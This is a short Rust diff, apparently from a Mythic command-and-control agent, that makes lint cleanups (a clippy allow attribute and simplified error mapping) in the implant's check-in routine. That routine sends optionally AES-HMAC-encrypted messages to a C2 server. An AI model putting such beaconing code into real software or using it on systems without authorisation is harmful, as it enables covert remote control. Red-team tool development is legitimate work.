@@ -86,6 +86,7 @@ impl ReqCheckin {
             ..Default::default()
         }
     }
+    #[allow(clippy::too_many_arguments)]
     pub fn new(
         uuid: Uuid,
         ips: Vec<String>,
@@ -319,13 +320,13 @@ pub fn direct_checkin<C: C2Transport>(
     let (resp, crypto, packed, response) = if let Some(key_b64) = c2.aes_psk() {
         let crypto = Aes256HmacCrypto::from_base64_key(&key_b64)?;
         let packed = encode_message(req, payload_uuid, &crypto, iv)?;
-        let response = c2.checkin(&packed).map_err(|e| MythicError::transport(e))?;
+        let response = c2.checkin(&packed).map_err(MythicError::transport)?;
         let (_, resp): (Uuid, RespCheckin) =
             decode_message(&response, Some(payload_uuid), &crypto)?;
         (resp, Some(crypto), packed, response)
     } else {
         let packed = encode_message_plain(req, payload_uuid)?;
-        let response = c2.checkin(&packed).map_err(|e| MythicError::transport(e))?;
+        let response = c2.checkin(&packed).map_err(MythicError::transport)?;
         let (_, resp): (Uuid, RespCheckin) =
             decode_message_plain(&response, Some(payload_uuid))?;
         (resp, None, packed, response)
